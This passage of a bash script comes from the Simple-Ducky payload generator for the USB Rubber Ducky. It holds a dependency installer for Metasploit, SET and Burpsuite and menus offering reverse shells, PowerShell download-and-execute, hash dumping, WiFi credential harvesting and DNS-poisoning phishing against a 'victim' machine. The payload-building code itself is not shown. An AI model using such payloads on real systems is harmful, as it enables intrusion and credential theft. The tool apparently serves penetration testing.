	xdg-open /usr/share/simple-ducky/ &
	clear
	f_mainmenu
}

#################################################################################
# Dependency Installer
#################################################################################
f_installer(){
clear
echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
sleep 3
apt-get update
echo ""
echo -e "\e[1;32m[+] APT Update complete...\e[0m"
sleep 3
clear

echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
sleep 3
updatedb
mkdir /tmp/simple-ducky/
echo ""

	machine=$(cat /etc/issue)
	if [ "$machine" == "Kali GNU/Linux 1.0 \n \l" ]; then
		echo -e "\n\e[1;34m[*] I see that you are using Kali-Linux. This will only take a few moments...\e[0m"
		echo ""
		sleep 3
		f_kaliinstall
	else
		f_otherdebian
	fi

}

########################################################
# Kali Install
########################################################
f_kaliinstall(){
	reqs="pure-ftpd dfu-programmer burpsuite mingw32"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
		isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;33m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Kali-Linux repository.\e[0m"
				touch /tmp/simple-ducky/$i-fail
			else
				dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
				isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
f_java

}

########################################################
# Other Debian Install
########################################################
f_otherdebian(){
	reqs="pure-ftpd file-roller dfu-programmer apache2 burpsuite nmap p7zip-full mingw32"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
		isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;33m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Kali-Linux repository.\e[0m"
				touch /tmp/simple-ducky/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/simple-ducky/$i-install.txt
				isinstalled=$(cat /tmp/simple-ducky/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done

f_metasploit
}

########################################################
# Metasploit
########################################################	
f_metasploit(){
clear
echo -e "\e[1;34m[*] Checking to see if Metasploit is installed...\e[0m\n"
if [ ! -e /usr/bin/msfconsole ] && [ ! -e /usr/sbin/msfconsole ] && [ ! -e /usr/local/sbin/msfconsole ] && [ ! -e /usr/local/bin/msfconsole ]; then
	update=1
	echo -e "\n\e[1;34m[*] It doesn't appear that Metasploit is installed on your system. Installing it now...\e[0m"
	echo ""
	machine=$(uname -m)
	if [ "$machine" == "x86_64" ]; then
		wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run -O /tmp/simple-ducky/metasploit-latest-linux-x64-installer.run
		echo -e "\n\e[1;33m[*] Launching the Metasploit installer. Select all the defaults and DONT launch the web UI...\e[0m"
		echo ""
		sleep 3
		chmod 755 /tmp/simple-ducky/metasploit-latest-linux-x64-installer.run
		/tmp/simple-ducky/metasploit-latest-linux-x64-installer.run
	else
		wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-installer.run -O /tmp/simple-ducky/metasploit-latest-linux-installer.run
		echo -e "\n\e[1;33m[*] Launching the Metasploit installer. Select all the defaults and DONT launch the web UI...\e[0m"
		echo ""
		sleep 3
		chmod 755 /tmp/simple-ducky/metasploit-latest-linux-installer.run
		/tmp/simple-ducky/metasploit-latest-linux-installer.run
	fi

	cd /usr/bin
	msfprogs="msfconsole msfupdate msfencode msfpayload"
	for z in $msfprogs; do
		if [ ! -e /usr/bin/$z ]; then
			ln -f -s /usr/local/bin/$z $z
		fi
	done
fi
echo -e "\e[1;32m[+] Good news, Metasploit installed without any issues.\e[0m"
echo ""
sleep 2

f_setoolkit
}

########################################################
# SE-Toolkit
########################################################	
f_setoolkit(){
clear
echo -e "\e[1;34m[+] Checking to see if the Social Engineering Toolkit is installed...\e[0m\n"
echo ""
sleep 4
	dpkg -s "set" &> /tmp/simple-ducky/set-install.txt
	setoolkit=$(cat /tmp/simple-ducky/set-install.txt | grep -o "Status: install ok installed")
	if [ "$setoolkit" == "Status: install ok installed" ]; then
	echo -e "\e[1;32m[+]  The SE-Toolkit is already installed on your system, moving on...\e[0m"
		echo ""
		sleep 4
	else			
		echo -e "\e[1;33m[-] It doesn't appear that the SE-Toolkit is installed on your system. Installing it now...\e[0m"
		echo -e ""
		sleep 3
		git clone https://github.com/trustedsec/social-engineer-toolkit/ /tmp/simple-ducky/set/
		chmod 755 /tmp/simple-ducky/set/setup.py
		python /tmp/simple-ducky/set/setup.py install
		echo ""
		echo -e "\e[1;32m[+] Good news, the SE-Toolkit installed without any issues.\e[0m"
		echo ""
		sleep 2
	fi


bsuite=$(cat /tmp/simple-ducky/burpsuite-install.txt | grep -o "is not installed" )
	if [ "$bsuite" == "is not installed" ]; then
		f_burpsuite
	else
		f_java
fi
}

########################################################
# Burpsuite
#######################################################
f_burpsuite(){
	clear
	echo -e "\e[1;34mTrying a different approach to install Burpsuite...\e[0m\n"
	echo ""
	sleep 3
	mkdir /usr/share/burpsuite/
	wget http://portswigger.net/burp/burpsuite_free_v1.5.jar -O /usr/share/burpsuite/burpsuite.jar
	chmod 755 /usr/share/burpsuite/burpsuite.jar
	ln -s /usr/share/burpsuite/burpsuite.jar /usr/bin/burpsuite.jar
	echo ""
	echo -e "\e[1;32m[+] Good news, Burpsuite installed without any issues.\e[0m"
	sleep 3
	clear
f_java
}

########################################################
# JavaInstall
########################################################
f_java(){
clear
echo -e "\e[1;34m[+] Checking your JDK version, I will update it if needed...\e[0m\n"
echo ""
sleep 4
	java -version &> /tmp/simple-ducky/java-version.txt
	javainstall=$(cat /tmp/simple-ducky/java-version.txt | grep -o "1.7.0")
	if [ "$javainstall" == "1.7.0" ]; then
		echo -e "\e[1;32m[+] It looks like your JDK is up to date, moving on..."
		sleep 4
	else			
		echo -e "\e[1;33m[+] It looks like we need to update JDK to version 1.7.0\e[0m"
		echo -e ""
		sleep 3
		apt-get install -y openjdk-7-jre-headless
		echo ""
		echo -e "\e[1;33m[*] When prompted select the option for: '...java-7-openjdk...'\e[0m"
		echo ""
		sleep 4
		update-alternatives --config java
		echo ""
		echo -e "\e[1;32m[+] Your new JDK version is...\e[0m"
		echo ""
		java -version
		sleep 5
		clear
	fi
f_cleanupexit

}
#################################################################################
# Cleanup and Return to the Main Menu
#################################################################################
f_cleanupexit(){
	echo ""
	echo -e "\e[1;32m[+] The installation process is complete! Returning to the main menu...\e[0m"
	echo ""
	sleep 5
	rm -rf /tmp/simple-ducky/
	clear
	f_mainmenu
}

#################################################################################
#################################################################################
#
# Menu Section
#
#################################################################################
#################################################################################

#################################################################################
# Main Menu - Banner
#################################################################################
f_banner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Get your USB Rubber Ducky @ http://hakshop.myshopify.com/"
	echo -e "If you would like to submit your payload send it to skysploit@gmail.com"
	echo -e "\e[1;31mHak5 forums:\e[0m http://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/"
	echo -e "\e[1;31mSimple-Ducky:\e[0m https://code.google.com/p/simple-ducky-payload-generator/"
	echo -e "\e[1;31mDucky-Decode:\e[0m https://code.google.com/p/ducky-decode/"
	echo -e "\e[1;31mSimple-Ducky Author:\e[0m Travis Weathers (skysploit) | skysploit@gmail.com"
	echo -e "\e[1;31mEncoder by:\e[0m ApacheTech & Midnitesnake \e[1;31mEncoder Version:\e[0m v2.6"
	echo -e "\e[1;31mLast Modified:\e[0m 22 JUN 2013 \e[1;31mSimple-Ducky Version:\e[0m v1.1.1"
	echo -e ""
}

#################################################################################
# Main Menu - Options
#################################################################################
f_mainmenu(){

f_banner
	echo -e "\e[1;34mWhere would you like to start?\e[0m"
	echo ""
	echo "1. Custom Payload Builder"
	echo "2. Windows Reverse Shell Payloads"
	echo "3. WiFi Attacks"
	echo "4. Password Attacks"
	echo "5. Linux & OS X Payloads"
	echo "6. Forced Phishing & Web Attacks"
	echo "7. Clean up the Encoder directory"	
	echo "8  Executables with Durandal Backdoor (DBD)"
	echo "9. Dependency Checker"
	echo "10.FTP Server Setup/User Add"
	echo "11.LM/NTLM Password Hasher"
	echo "12.Site2lst Custom Wordlist Builder"
	echo "13.Quit"
	echo ""
	read -p "Option: " option

	case $option in
	1) f_payloadbuilder ;;
	2) f_windowsshellmenu ;;
	3) f_wifimenu ;;
	4) f_passwordmenu ;;
	5) f_linuxosxmenu ;;
	6) f_forcedphishmenu ;;
	7) f_cleanup ;;
	8) f_dbdbuilder ;;
	9) f_installer ;;
	10) f_ftpsetup ;;
	11) f_lmntlmhasher ;;
	12) f_site2lst ;;
	13) clear;exit ;;
	adv) f_advancedmenu ;;
	*) clear;exit ;;

	esac

}

#################################################################################
# Windows Reverse Shell - Banner
#################################################################################
f_winshellbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Windows reverse shell payloads of various types"
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Windows Reverse Shell - Options
#################################################################################
f_windowsshellmenu(){

f_winshellbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. DBD Reverse SYSTEM Shell (SSL & Persistant) (Win Vista/7)"
	echo "2. DBD Reverse SYSTEM Shell (SSL & Persistant) (Win 8)"
	echo "3. Persistence Reverse Shell (Win Vista/7)"
	echo "4. Persistence Reverse Shell (Win 8)"
	echo "5. Windows Reverse Shell (No Download|W2K/XP)"
	echo "6. Windows Reverse Shell (No Download|Win Vista/7)"
	echo "7. Windows Reverse Shell (No Download|Win 8)"
	echo "8. Powershell Download & Execute (User Priv Shell|Win Vista/7)"
	echo "9. Powershell Download & Execute (Admin Priv Shell|Win Vista/7)"
	echo "10.Powershell Download & Execute (User Priv Shell|Win 8)"
	echo "11.Powershell Download & Execute (Admin Priv Shell|Win 8)"
	echo "12.Return to Main Menu"
	echo "13.Quit"
	echo ""
	read -p "Option: " option
	
	if [ "$option" == "1" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_windowsdbdVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_windowsdbdVIS7nouac
		fi
	elif [ "$option" == "2" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_windowsdbdwin8uac
		elif [ "$uacenabled" == "n" ]; then
			f_windowsdbdwin8nouac
		fi
	elif [ "$option" == "3" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_persistenceVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_persistenceVIS7nouac
		fi
	elif [ "$option" == "4" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_persistenceWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_persistenceWIN8nouac
		fi
	elif [ "$option" == "5" ]; then
		f_windowsrevW2KXP
	elif [ "$option" == "6" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_windowsrevVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_windowsrevVIS7nouac
		fi	
	elif [ "$option" == "7" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_windowsrevWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_windowsrevWIN8nouac
		fi
	elif [ "$option" == "8" ]; then
		f_powershellVIS7
	elif [ "$option" == "9" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_powershellVIS7admuac
		elif [ "$uacenabled" == "n" ]; then
			f_powershellVIS7admnouac
		fi
	elif [ "$option" == "10" ]; then
		f_powershellWIN8
	elif [ "$option" == "11" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_powershellWIN8admuac
		elif [ "$uacenabled" == "n" ]; then
			f_powershellWIN8admnouac
		fi
	elif [ "$option" == "12" ]; then
		f_mainmenu
	elif [ "$option" == "13" ]; then
		clear;exit
	elif [ "$option" == "*" ]; then
		clear;exit
	fi
}

#################################################################################
# Wifi Attacks - Banner
#################################################################################
f_wifibanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Some of these payloads go great with the WiFi Pineapple"
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Wifi Attacks - Options
################################################################################
f_wifimenu(){

f_wifibanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. WiFi Backdoor (Win Vista/7)"
	echo "2. WiFi Backdoor (Win 8)"
	echo "3. WiFi Autoconnect (Designed for the WiFi Pineapple | Win Vista/7)"
	echo "4. WiFi Autoconnect (Designed for the WiFi Pineapple | Win 8)"
	echo "5. Return to Main Menu"	
	echo "6. Quit"
	echo ""
	read -p "Option: " option
	
	
		if [ "$option" == "1" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_wifibackdoorVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_wifibackdoorVIS7nouac
		fi
	elif [ "$option" == "2" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_wifibackdoorWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_wifibackdoorWIN8nouac
		fi
	elif [ "$option" == "3" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_wifiautoconnectVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_wifiautoconnectVIS7nouac
		fi	
	elif [ "$option" == "4" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_wifiautoconnectWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_wifiautoconnectWIN8nouac
		fi
	elif [ "$option" == "5" ]; then
		f_mainmenu
	elif [ "$option" == "6" ]; then
		clear;exit
	elif [ "$option" == "*" ]; then
		clear;exit
fi

}

#################################################################################
# Password Attacks - Banner
#################################################################################
f_passwordbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Awww... The power of credential harvesting."
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Password Attacks - Options
################################################################################
f_passwordmenu(){

f_passwordbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. LM/NTLM Hash Dump From Live System (Win Vista/7)"
	echo "2. LM/NTLM Hash Dump From Live System (Win 8)"
	echo "3. WiFi Acess Point Crediential Harvester (Win Vista/7)"
	echo "4. WiFi Acess Point Crediential Harvester (Win 8)"
	echo "5. Return to Main Menu"	
	echo "6. Quit"
	echo ""
	read -p "Option: " option

	if [ "$option" == "1" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_livehashVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_livehashVIS7nouac
		fi
	elif [ "$option" == "2" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_livehashWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_livehashWIN8nouac
		fi
	elif [ "$option" == "3" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_wifunVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_wifunVIS7nouac
		fi	
	elif [ "$option" == "4" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_wifunWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_wifunWIN8nouac
		fi
	elif [ "$option" == "5" ]; then
		f_mainmenu
	elif [ "$option" == "6" ]; then
		clear;exit
	elif [ "$option" == "*" ]; then
		clear;exit
fi

}

#################################################################################
# Linux & OSX - Banner
#################################################################################
f_linuxosxbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Not much here but they work"
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) "
	echo -e ""
}

#################################################################################
# Linux & OSX - Options
#################################################################################
f_linuxosxmenu(){

f_linuxosxbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. OSX Reverse Shell"
	echo "2. OSX Single User Mode Reverse Shell"
	echo "3. Linux Reverse Shell"
	echo "4. Return to Main Menu"
	echo "5. Quit"
	echo ""
	read -p "Option: " option

	case $option in	
	1) f_osxrev ;;
	2) f_osxsingleuserrev ;;
	3) f_linuxrev ;;
	4) f_mainmenu ;;
	5) clear;exit ;;
	*) clear;exit ;;
	esac

}

#################################################################################
# Forced Phishing / Web Attacks - Banner
#################################################################################
f_forcedphishbanner(){
	clear
	echo -e "\e[1;31mSimple-Ducky Payload Generator\e[0m "
	echo -e "Forced Phishing, because they don't have an option..."
	echo -e "If you would like to contribute your payload contact the author at skysploit@gmail.com"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo -e ""
}

#################################################################################
# Forced Phishing / Web Attacks - Options
################################################################################
f_forcedphishmenu(){

f_forcedphishbanner
	echo -e "\e[1;34mWhat payload would you like to use?\e[0m"
	echo ""
	echo "1. Local DNS Poisoning | SE-Toolkit w/UAC (Win Vista/7)"
	echo "2. Local DNS Poisoning | SE-Toolkit w/UAC (Win 8)"
	echo "3. Local DNS Poisoning | Browser_Autopwn w/UAC (Win Vista/7)"
	echo "4. Local DNS Poisoning | Browser_Autopwn w/UAC (Win 8)"
	echo "5. Proxy in the Middle (PiTM) | No Admin Needed (Win XP/Vista/7)"
	echo "6. Proxy in the Middle (PiTM) | No Admin Needed (Win 8)"
	echo "7. Return to Main Menu"	
	echo "8. Quit"
	echo ""
	read -p "Option: " option
	
	
	if [ "$option" == "1" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_setlocaldnsVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_setlocaldnsVIS7nouac
		fi
	elif [ "$option" == "2" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_setlocaldnsWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_setlocaldnsWIN8nouac
		fi
	elif [ "$option" == "3" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_autopwnlocaldnsVIS7uac
		elif [ "$uacenabled" == "n" ]; then
			f_autopwnlocaldnsVIS7nouac
		fi	
	elif [ "$option" == "4" ]; then
		echo ""
		read -p "Is User Access Control (UAC) enabled on the victims machine [y|n]? " uacenabled
		if [ "$uacenabled" == "y" ]; then
			f_autopwnlocaldnsWIN8uac
		elif [ "$uacenabled" == "n" ]; then
			f_autopwnlocaldnsWIN8nouac
		fi
	elif [ "$option" == "5" ]; then
		f_proxyinthemiddleXPVIS7
	elif [ "$option" == "6" ]; then
		f_proxyinthemiddleWIN8		
	elif [ "$option" == "7" ]; then
		f_mainmenu
	elif [ "$option" == "8" ]; then
		clear;exit
	elif [ "$option" == "*" ]; then
		clear;exit
fi	

}

#################################################################################
# Run as Root Query
#################################################################################
#!/bin/bash
#resize -s 35 115
cd /usr/share/simple-ducky
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[!] This script must be run as root\e[0m" 1>&2
	exit 1
else
	f_mainmenu
fi
